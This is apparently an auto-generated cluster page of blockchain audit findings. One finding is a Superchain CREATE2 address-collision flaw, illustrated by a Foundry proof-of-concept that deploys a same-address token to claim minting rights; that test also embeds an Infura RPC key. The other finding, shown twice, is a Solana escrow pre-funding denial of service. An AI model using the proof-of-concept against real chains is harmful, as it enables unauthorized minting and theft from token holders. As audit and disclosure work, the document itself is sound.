# Cluster -1238

**Rank:** #423  
**Count:** 10  

## Label
Addressing chain-specific token address collisions and improper initialization enables attackers to hijack token supply, create invalid pools, or exploit state inconsistencies, leading to inflation, denial-of-service, or unauthorized minting.

## Cluster Information
- **Total Findings:** 10

## Examples

### Example 1

**Auto Label:** Addressing chain-specific token address collisions and improper initialization enables attackers to hijack token supply, create invalid pools, or exploit state inconsistencies, leading to inflation, denial-of-service, or unauthorized minting.  

**Original Text Preview:**

## Severity: High Risk

## Context
(No context files were provided by the reviewer)

## Description
When sending an ERC20 across the SuperchainTokenBridge, we assume that the token has the same address on both chains. In `sendERC20()`, we encode the sent token address in the relay call:

```solidity
bytes memory message = abi.encodeCall(this.relayERC20, (_token, msg.sender, _to, _amount));
```

In `relayERC20()`, we call `crosschainMint()` on this address:

```solidity
ISuperchainERC20(_token).crosschainMint(_to, _amount);
```

This means that any two SuperchainERC20 compatible tokens deployed on chains in the same cluster can be exchanged freely with one another. Currently, the plan is for these tokens to be deployed using a generic `CREATE2` factory. Given the existence of the same factory on both chains, the inputs into the deterministic generation of the token's address are the salt and the initialization code (which includes constructor arguments).

This means that any Superchain token implementation that either (a) uses a fixed address instead of constructor arguments to allocate initial tokens or ownership of the contract or (b) uses an `initialize()` function after the constructor for the same purposes, will be deployed to identical addresses with different outcomes. Note that this is near impossible to avoid because, each time a new chain is added to the interop set, the attack becomes possible. An astute attacker could predeploy token contracts on potential interop chains so that, upon interop being enabled, they would get unlimited minting rights on the legitimate tokens on other chains.

## Proof of Concept
The following test demonstrates the example where funds are sent in an `initialize()` function. Note that the same attack is possible if ownership is allocated this way, or if these values are set to hardcoded values (such as Gnosis Safes) that may be claimable on the other network.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";
import { SuperchainERC20 } from "@optimism/L2/SuperchainERC20.sol";

interface Create2Factory {
    function deploy(uint256 value, bytes32 salt, bytes memory code) external;
    function computeAddress(bytes32 salt, bytes32 codeHash) external view returns(address);
}

contract SuperchainUSDC is SuperchainERC20 {
    function initialize() external {
        require(totalSupply() == 0, "already initialized");
        _mint(msg.sender, 100_000_000e18);
    }

    function name() public pure override returns (string memory) {
        return "Superchain USDC";
    }
    
    function symbol() public pure override returns (string memory) {
        return "USDC";
    }
}

contract Create2Test is Test {
    Create2Factory CREATE2 = Create2Factory(0x13b0D85CcB8bf860b6b79AF3029fCA081AE9beF2);
    
    function testCreate2Address() external {
        address honest = address(uint160(uint256(keccak256("honest user"))));
        address malicious = address(uint160(uint256(keccak256("malicious user"))));
        
        vm.createSelectFork("https://optimism-mainnet.infura.io/v3/fb419f740b7e401bad5bec77d0d285a5");
        
        // On the original chain, a token is deployed with CREATE2 factory.
        uint before = vm.snapshot();
        bytes memory initCode = type(SuperchainUSDC).creationCode;
        vm.startPrank(honest);
        CREATE2.deploy(0, bytes32(0), initCode);
        SuperchainUSDC honestToken = SuperchainUSDC(CREATE2.computeAddress(bytes32(0), keccak256(initCode)));
        honestToken.initialize();
        assertEq(honestToken.balanceOf(honest), 100_000_000e18);
        
        // On the new chain, a malicious user deploys a token with the same code and claims the assets.
        vm.revertTo(before);
        vm.startPrank(malicious);
        CREATE2.deploy(0, bytes32(0), initCode);
        SuperchainUSDC maliciousToken = SuperchainUSDC(CREATE2.computeAddress(bytes32(0), keccak256(initCode)));
        maliciousToken.initialize();
        assertEq(maliciousToken.balanceOf(malicious), 100_000_000e18);
    }
}
```

## Recommendation
SuperchainToken developers must be made aware of the fact that all important values must be set in the token's constructor to ensure only an identical deployment with identical properties can be deployed to the same address.

## OP Labs
Acknowledged. From the documentation:
To ensure security, you must either design the deployer to allow only a specific trusted ERC-20 contract, such as SuperchainERC20, to be deployed through it, or call `CREATE2` to deploy the contract directly from an EOA you control. This precaution is critical because if an unauthorized ERC-20 contract is deployed at the same address on any Superchain network, it could allow malicious actors to mint unlimited tokens and bridge them to the network where the original ERC-20 contract resides.

## Cantina Managed
Acknowledged.

---
### Example 2

**Auto Label:** Address collisions and flawed invariant checks enable attackers to manipulate or block contract initialization, leading to unintended overwrites, state manipulation, or denial of service.  

**Original Text Preview:**

## Severity

**Impact:** High

**Likelihood:** Medium

## Description

The sol_escrow account can be preemptively funded with SOL by an attacker before the bonding curve is created. Since the `create_bonding_curve` instruction initializes `real_sol_reserves` to 0, but the invariant check verifies that the actual SOL balance matches this value, the presence of any SOL in the escrow account will cause the curve creation to fail.

This is possible because:

- The sol_escrow PDA address is deterministic and can be calculated by anyone who knows the mint address
- Anyone can send SOL to this address before the curve is created
- The invariant strictly enforces `sol_escrow_lamports == real_sol_reserves`

Code snippets:

```rust
// In create_bonding_curve.rs
pub fn handler(ctx: Context<CreateBondingCurve>, params: CreateBondingCurveParams) -> Result<()> {
    // real_sol_reserves initialized to 0
    ctx.accounts.bonding_curve.update_from_params(...);

    // Invariant check will fail if escrow has SOL
    BondingCurve::invariant(locker)?;
}

// In curve.rs
pub fn invariant<'info>(ctx: &mut BondingCurveLockerCtx<'info>) -> Result<()> {
    if sol_escrow_lamports != bonding_curve.real_sol_reserves {
        return Err(ContractError::BondingCurveInvariant.into());
    }
}
```

## Recommendations

Initialize `real_sol_reserves` to match any existing SOL balance in the escrow during creation.

If that's not desirable, add a SOL sweep mechanism during curve creation that transfers any existing SOL to the creator, for example:

- Check if there's any existing SOL in the escrow
- If found, sweep it to the creator/admin using a signed CPI
- Then continue with regular curve creation

---
### Example 3

**Auto Label:** Address collisions and flawed invariant checks enable attackers to manipulate or block contract initialization, leading to unintended overwrites, state manipulation, or denial of service.  

**Original Text Preview:**

## Severity

**Impact:** High

**Likelihood:** Medium

## Description

The sol_escrow account can be preemptively funded with SOL by an attacker before the bonding curve is created. Since the `create_bonding_curve` instruction initializes `real_sol_reserves` to 0, but the invariant check verifies that the actual SOL balance matches this value, the presence of any SOL in the escrow account will cause the curve creation to fail.

This is possible because:

- The sol_escrow PDA address is deterministic and can be calculated by anyone who knows the mint address
- Anyone can send SOL to this address before the curve is created
- The invariant strictly enforces `sol_escrow_lamports == real_sol_reserves`

Code snippets:

```rust
// In create_bonding_curve.rs
pub fn handler(ctx: Context<CreateBondingCurve>, params: CreateBondingCurveParams) -> Result<()> {
    // real_sol_reserves initialized to 0
    ctx.accounts.bonding_curve.update_from_params(...);

    // Invariant check will fail if escrow has SOL
    BondingCurve::invariant(locker)?;
}

// In curve.rs
pub fn invariant<'info>(ctx: &mut BondingCurveLockerCtx<'info>) -> Result<()> {
    if sol_escrow_lamports != bonding_curve.real_sol_reserves {
        return Err(ContractError::BondingCurveInvariant.into());
    }
}
```

## Recommendations

Initialize `real_sol_reserves` to match any existing SOL balance in the escrow during creation.

If that's not desirable, add a SOL sweep mechanism during curve creation that transfers any existing SOL to the creator, for example:

- Check if there's any existing SOL in the escrow
- If found, sweep it to the creator/admin using a signed CPI
- Then continue with regular curve creation

---
